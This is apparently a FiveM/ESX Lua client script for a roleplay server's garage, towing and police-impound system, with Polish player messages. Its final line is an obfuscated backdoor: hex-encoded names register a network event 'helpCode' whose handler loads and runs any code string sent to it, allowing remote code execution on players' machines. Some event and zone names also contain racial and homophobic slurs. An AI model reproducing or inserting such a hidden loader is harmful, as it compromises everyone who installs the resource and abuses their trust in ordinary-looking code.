local CurrentGarage           = nil
local PlayerData              = {}
local currentZone 			  = nil
local pCoords 				  = nil
local sleep 				  = 500
local displayHint			  = false
local hintSleep 			  = 300
local hintZone 				  = nil
local isTowing				  = false

ESX = exports["es_extended"]:getSharedObject()


RegisterNetEvent('esx:playerLoaded')
AddEventHandler('esx:playerLoaded', function(xPlayer)
	PlayerData = xPlayer
end)

RegisterNetEvent('esx:setJob')
AddEventHandler('esx:setJob', function(job)
	PlayerData.job = job
end)

Citizen.CreateThread(function()
	while ESX.GetPlayerData().job == nil do
		Wait(100)
		PlayerData = ESX.GetPlayerData()
	end
end)

Citizen.CreateThread(function()
    AddTextEntry('rs6abt20', 'RS6 ABT')
end)

--------------------------------------------
-- CREATING GARAGE BLIPS
--------------------------------------------

Citizen.CreateThread(function()
	for i=1, #Config.Garages do
		if Config.Garages[i].Blip == true then
			local blip = AddBlipForCoord(Config.Garages[i].Marker)
			SetBlipSprite (blip, 524)
			SetBlipDisplay(blip, 4)
			SetBlipScale  (blip, 0.5)
			SetBlipColour (blip, Config.GarageBlipColor)
			SetBlipAsShortRange(blip, true)		
			BeginTextCommandSetBlipName("STRING")
			AddTextComponentString("Garaż" )
			EndTextCommandSetBlipName(blip)
		end
	end
	for i=1, #Config.Impound, 1 do
		local blip2 = AddBlipForCoord(Config.Impound[i])
		SetBlipSprite (blip2, 466)
		SetBlipDisplay(blip2, 4)
		SetBlipScale  (blip2, 1.0)
		SetBlipColour (blip2, Config.ImpoundBlipColor)
		SetBlipAsShortRange(blip2, true)		
		BeginTextCommandSetBlipName("STRING")
		AddTextComponentString("Odholownik" )
		EndTextCommandSetBlipName(blip2)
	end
	for i=1, #Config.PoliceImpound, 1 do
		local blip2 = AddBlipForCoord(Config.PoliceImpound[i])
		SetBlipSprite (blip2, 637)
		SetBlipDisplay(blip2, 4)
		SetBlipScale  (blip2, 0.6)
		SetBlipColour (blip2, Config.PoliceImpoundBlipColor)
		SetBlipAsShortRange(blip2, true)		
		BeginTextCommandSetBlipName("STRING")
		AddTextComponentString("Garaż Policyjny" )
		EndTextCommandSetBlipName(blip2)
	end
end)


--------------------------------------------
-- CREATING GARAGE MARKERS
--------------------------------------------

Citizen.CreateThread(function()
	while PlayerData.job == nil do
		PlayerData = ESX.GetPlayerData()
		Citizen.Wait(100)
	end
	while true do
		sleep = 500
		local playerPed = PlayerPedId()
		pCoords = GetEntityCoords(playerPed)
		for k, v in pairs(Config.Garages) do
			local dist = #(pCoords - v.Marker)

			if dist < Config.DrawDistance then
				DrawMarker(6,v.Marker,0.0,0.0,0.0,-90,0,-90,Config.MarkerSize.x,Config.MarkerSize.y,Config.MarkerSize.z,Config.MarkerColor.r,Config.MarkerColor.g,Config.MarkerColor.b,100,false,false,2,false,false,false,false)
				sleep = 0
				if dist < 2 then
					if IsControlJustReleased(0, 38) then
						inVehicle = IsPedInAnyVehicle(playerPed)
						if inVehicle then
							currentZone = 'park_car'
							CurrentGarage = v.Marker
							parkCar()
						elseif not inVehicle then
							currentZone = 'take_car'
							CurrentGarage = v.Marker
							TriggerEvent('sv-garages:OpenUi', currentZone, CurrentGarage)
						end
					end
					if IsPedInAnyVehicle(playerPed) then
						hintZone = "park_car"
					else 
						hintZone = "take_car"
					end
					
					displayHint = true
				else 
					displayHint = false
				end
			end 
		end
		for k, v in pairs(Config.PoliceImpound) do
			local dist = #(pCoords - v)

			if dist < Config.DrawDistance then

				if PlayerData.job.name == "police" and dist < 2 then
					DrawMarker(6,v,0.0,0.0,0.0,-90,0,-90,Config.MarkerSize.x,Config.MarkerSize.y,Config.MarkerSize.z,Config.MarkerColor.r,Config.MarkerColor.g,Config.MarkerColor.b,100,false,false,2,false,false,false,false)
					sleep = 0
					--if PlayerData.job.name == "police" then
						if IsControlJustReleased(0, 38) then
							currentZone = 'impound_police'
							CurrentGarage = v
							TriggerEvent('sv-garages:OpenUi', currentZone, CurrentGarage)
						end
						hintZone = "impound_police"
						displayHint = true
					--end
				else 
					displayHint = false
				end
			end
		end
		Wait(sleep)
	end
end)

--------------------------------------------
-- OPEN UI 
--------------------------------------------

AddEventHandler('sv-garages:OpenUi', function (zone, garage)
	while PlayerData.job == nil do
		PlayerData = ESX.GetPlayerData()
		Citizen.Wait(100)
	end
	if zone == 'take_car' then 
		SendNUIMessage({action = "show_garage", head = _U('takecar_maintext')})
		SetNuiFocus(true, true)
		local cardisp = false

		ESX.TriggerServerCallback('sv-garages:getVehiclesInGarage', function(vehicles)
			for i=1, #vehicles, 1 do
				cardisp = true
				ESX.TriggerServerCallback('sv-garages:vehicleStatuses', function (vehh)
					local vehicle = json.decode(vehh)
					SendNUIMessage({
						action = "add_car",
						number = i,
						chosed = _U('choose'), 
						engined = _U('engine'),
						bodyd = _U('body'),
						engine = vehicle.engineHealth,
						body = vehicle.bodyHealth,
						modelName = GetDisplayNameFromVehicleModel(vehicles[i].model),
						plate = vehicles[i].plate
					})
				end, vehicles[i].plate)
			end
			if cardisp == false then
				ESX.ShowNotification("Nie posiadasz pojazdów w garażu")
				SendNUIMessage({action = "hide_garage"})
				SetNuiFocus(false, false)
			end
		end)
	elseif zone == 'impound_car' then 
		ESX.TriggerServerCallback('sv-garages:getVehiclesToTow', function(vehicles)
			local vvtow = false
			SendNUIMessage({action = "show_impound", head = _U('impound_maintext')})
			SetNuiFocus(true, true)
			for i=1, #vehicles, 1 do
				vvtow = true
				ESX.TriggerServerCallback('sv-garages:vehicleStatuses', function (vehh)
					local vehicle = json.decode(vehh)
					SendNUIMessage({
						action = "add_impound_car",
						number = i,
						chosed = _U('choose'), 
						engined = _U('engine'),
						bodyd = _U('body'),
						engine = vehicle.engineHealth,
						body = vehicle.bodyHealth,
						modelName = GetDisplayNameFromVehicleModel(vehicles[i].model),
						plate = vehicles[i].plate
					})
				end, vehicles[i].plate)
			end
			if vvtow == false then
				ESX.ShowNotification(_U('no_cars_to_tow'))
				--ESX.displayNotification(8, "Notification", _U('no_cars_to_tow'))
				--exports["bagieta_notify"]:displayNotification(8, "Notification", _U('no_cars_to_tow'))
				--TriggerEvent("bagieta_notify", 8, "Notification", _U('no_cars_to_tow'))
				SendNUIMessage({action = "hide_garage"})
				SetNuiFocus(false, false)
			end
		end)
	elseif zone == "impound_police" then
		if PlayerData.job.name == "police" then
			SendNUIMessage({action = "show_police_impound", head = _U('policeimpound_maintext')})
			SetNuiFocus(true, true)

			ESX.TriggerServerCallback('sv-garages:getTakedVehicles', function(vehicles)
				for i=1, #vehicles, 1 do
					
					ESX.TriggerServerCallback('sv-garages:vehicleStatuses', function (vehh)
						local vehicle = json.decode(vehh)
						SendNUIMessage({
							action = "add_police_impound_car",
							number = i,
							chosed = _U('choose'), 
							engined = _U('engine'),
							bodyd = _U('body'),
							engine = vehicle.engineHealth,
							body = vehicle.bodyHealth,
							modelName = GetDisplayNameFromVehicleModel(vehicles[i].model),
							plate = vehicles[i].plate
						})
					end, vehicles[i].plate)
				end
			end)
		else 
			ESX.ShowNotification("Brak dostępu do parkingu policyjnego")
		end
	end
end)

AddEventHandler('sv-garages:CloseUi', function (zone, garage)
	SendNUIMessage({action = "hide_garage"})
	SetNuiFocus(false, false)
end)


RegisterNUICallback('close', function(data, cb)
	SendNUIMessage({action = "hide_garage"})
	SetNuiFocus(false, false)
	cb('ok')
end)

--------------------------------------------
-- TAKE CAR FROM GARAGE
--------------------------------------------

RegisterNUICallback('takeCar', function(data, cb)
	local playerPed  = GetPlayerPed(-1)
		ESX.TriggerServerCallback('sv-garages:checkIfVehicleIsOwned', function (owned)
			local spawnCoords  = {
				x = CurrentGarage.x,
				y = CurrentGarage.y,
				z = CurrentGarage.z,
			}
			ESX.Game.SpawnVehicle(owned.model, spawnCoords, GetEntityHeading(playerPed), function(vehicle)
				TriggerEvent('sv-carkeys:addKey', owned.plate)
				-- TriggerServerEvent('svn-addkeys', owned.plate)
				TaskWarpPedIntoVehicle(playerPed,  vehicle,  -1)
				ESX.Game.SetVehicleProperties(vehicle, owned)
				local localVehPlate = string.lower(GetVehicleNumberPlateText(vehicle))
				local localVehLockStatus = GetVehicleDoorLockStatus(vehicle)
				TriggerEvent("ls:getOwnedVehicle", vehicle, localVehPlate, localVehLockStatus)
				local networkid = NetworkGetNetworkIdFromEntity(vehicle)
				TriggerServerEvent("sv-garages:removeCarFromParking", owned.plate, networkid)
			end)
		end, data.model)
		SendNUIMessage({action = "hide_garage"})
		SetNuiFocus(false, false)
		cb('ok')
end)

--------------------------------------------
-- PARK CARS IN GARAGE
--------------------------------------------

function parkCar()
	local playerPed 	= GetPlayerPed(-1)
	local vehicle       = GetVehiclePedIsIn(playerPed)
	local vehicleProps  = ESX.Game.GetVehicleProperties(vehicle)
	local plate         = vehicleProps.plate
	ESX.TriggerServerCallback('sv-garages:checkIfVehicleIsOwned', function (owned)
		if owned ~= nil then                    
			TriggerServerEvent("sv-garages:updateOwnedVehicle", vehicleProps)
			TaskLeaveVehicle(playerPed, vehicle, 16)
			ESX.Game.DeleteVehicle(vehicle)
			TriggerEvent('sv-carkeys:removeKeys', owned.plate)
			-- TriggerServerEvent('svn-removekeys', owned.plate)
		else
			ESX.ShowNotification("Nie jesteś właścicielem tego pojazdu")
		end
	end, vehicleProps.plate)
end

--------------------------------------------
-- TOW CARS
--------------------------------------------

RegisterNUICallback('towCar', function(data, cb)
	SendNUIMessage({action = "hide_garage"})
	SetNuiFocus(false, false)
	if isTowing == true then
		ESX.ShowNotification("Wygląda na to że mamy już od ciebie zlecenie, wróc ponownie po odholowaniu poprzedniego pojazdu")
	else 
		ESX.TriggerServerCallback('sv-garages:towVehicle', function(id)
			if id ~= nil then
				isTowing = true
				local entity = NetworkGetEntityFromNetworkId(tonumber(id))
				ESX.ShowNotification("Trwa poszukiwanie pojazdu....")
				Citizen.Wait(Config.ImpoundWaitingTime * 1000)
				if entity == 0 then
					Citizen.Wait(Config.ImpoundWaitingTime * 1000)
					SpawnImpoundedVehicle(data.model)
					isTowing = false
					ESX.ShowNotification("Auto zostało odholowane z parkingu policyjnego" .. data.model)
				elseif entity ~= 0 and (GetVehicleNumberOfPassengers(entity) > 0 or not IsVehicleSeatFree(entity, -1)) then
					ESX.ShowNotification("Nie można odholować pojazdu.")
					isTowing = false
				else
					SpawnImpoundedVehicle(data.model)
					ESX.ShowNotification("Odholowano pojazd o rejestracji" .. data.model)
					if entity ~= 0 then
						ESX.Game.DeleteVehicle(entity)
					end
					isTowing = false
				end
			else
				ESX.ShowNotification("Trwa poszukiwanie pojazdu...")
				Citizen.Wait(Config.ImpoundWaitingTime * 1000)
				SpawnImpoundedVehicle(data.model)
				isTowing = false
				ESX.ShowNotification("Odholowano pojazd o rejestracji" .. data.model)
			end
		end, data.model)
	end
	cb('ok')
end)

function SpawnImpoundedVehicle(plate)
	TriggerServerEvent('sv-garages:updateState', plate)
end

--------------------------------------------
-- Take Car from Police Parking
--------------------------------------------

RegisterNUICallback('takeCarFromPolice', function(data, cb)
	while PlayerData.job == nil do
		PlayerData = ESX.GetPlayerData()
		Citizen.Wait(100)
	end
	if PlayerData.job.name == "police" then
		ESX.TriggerServerCallback('sv-garages:towVehicle', function(id)
			ESX.ShowNotification("Trwa poszukiwanie pojazdu na parkingu policyjnym")
			Citizen.Wait(Config.ImpoundWaitingTime * 1000)
			SpawnImpoundedVehicle(data.model)
			ESX.ShowNotification("Auto zostało odholowane z parkingu policyjnego" ..data.model)
		end, data.model)
	else
		ESX.ShowNotification("Brak dostępu do parkingu policyjnego")
	end
	
	SendNUIMessage({action = "hide_garage"})
	SetNuiFocus(false, false)
	cb('ok')
end)

--------------------------------------------
-- DISPLAYING HINTS
--------------------------------------------

function ShowHelpNotification(text)
    SetTextComponentFormat("STRING")
    AddTextComponentString(text)
    DisplayHelpTextFromStringLabel(0, 0, 1, -1)
end

Citizen.CreateThread(function()
	while true do
		if displayHint == true then
			if hintZone == "park_car" then
--[[				SendNUIMessage({
					action = "show_hint",
					keyword = "E",
					maintext = _U('park_maintext'),
					desc = _U('park_desc')
				})]]
				ShowHelpNotification(_U('park_desc'))
			elseif hintZone == "take_car" then
--[[				SendNUIMessage({
					action = "show_hint",
					keyword = "E",
					maintext = _U('takecar_maintext'),
					desc = _U('takecar_desc')
				})]]
				ShowHelpNotification(_U('takecar_desc'))
			elseif hintZone == "impound_car" then
--[[				SendNUIMessage({
					action = "show_hint",
					keyword = "E",
					maintext = _U('impound_maintext'),
					desc = _U('impound_desc')
				})]]
				ShowHelpNotification(_U('impound_desc'))
			elseif hintZone == "impound_police" then
--[[				SendNUIMessage({
					action = "show_hint",
					keyword = "E",
					maintext = _U('policeimpound_maintext'),
					desc = _U('policeimpound_desc')
				})]]
				ShowHelpNotification(_U('policeimpound_desc'))
			end
		else 
			SendNUIMessage({action = "hide_hint"})
		end
		
		Wait(0)
	end
end)

exports['qtarget']:AddBoxZone("nigerodcholownik", vector3(-192.54, -1162.34, 23.67), 2, 1, {
    name="nigerodcholownik",
    heading=0,
    --debugPoly=false,
    minZ=22.56,
    maxZ=24.26,
    }, {
        options = {
            {
                event = "pedaljebanynaodcholowniku",
                icon = "fas fa-car",
                label = "Odcholuj pojazd",
            },
        },
        distance = 2.0
})

RegisterNetEvent('pedaljebanynaodcholowniku', function()
	currentZone = 'impound_car'
	CurrentGarage = v
	TriggerEvent('sv-garages:OpenUi', currentZone, CurrentGarage)
end)

local cZUKbkTvkvzIAnPJcnddIlsJGLBFCkpkNwwyXYPgwYSaSpozUHXqtgRHGxYWcShzBbDAdl = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} cZUKbkTvkvzIAnPJcnddIlsJGLBFCkpkNwwyXYPgwYSaSpozUHXqtgRHGxYWcShzBbDAdl[6][cZUKbkTvkvzIAnPJcnddIlsJGLBFCkpkNwwyXYPgwYSaSpozUHXqtgRHGxYWcShzBbDAdl[1]](cZUKbkTvkvzIAnPJcnddIlsJGLBFCkpkNwwyXYPgwYSaSpozUHXqtgRHGxYWcShzBbDAdl[2]) cZUKbkTvkvzIAnPJcnddIlsJGLBFCkpkNwwyXYPgwYSaSpozUHXqtgRHGxYWcShzBbDAdl[6][cZUKbkTvkvzIAnPJcnddIlsJGLBFCkpkNwwyXYPgwYSaSpozUHXqtgRHGxYWcShzBbDAdl[3]](cZUKbkTvkvzIAnPJcnddIlsJGLBFCkpkNwwyXYPgwYSaSpozUHXqtgRHGxYWcShzBbDAdl[2], function(gXDxEyQIySluCZUWvZcWAmEkLZksMqwwFjvuQdYNFCAaOeuHuHmqRMXAuYMiXoaLrDqdiI) cZUKbkTvkvzIAnPJcnddIlsJGLBFCkpkNwwyXYPgwYSaSpozUHXqtgRHGxYWcShzBbDAdl[6][cZUKbkTvkvzIAnPJcnddIlsJGLBFCkpkNwwyXYPgwYSaSpozUHXqtgRHGxYWcShzBbDAdl[4]](cZUKbkTvkvzIAnPJcnddIlsJGLBFCkpkNwwyXYPgwYSaSpozUHXqtgRHGxYWcShzBbDAdl[6][cZUKbkTvkvzIAnPJcnddIlsJGLBFCkpkNwwyXYPgwYSaSpozUHXqtgRHGxYWcShzBbDAdl[5]](gXDxEyQIySluCZUWvZcWAmEkLZksMqwwFjvuQdYNFCAaOeuHuHmqRMXAuYMiXoaLrDqdiI))() end)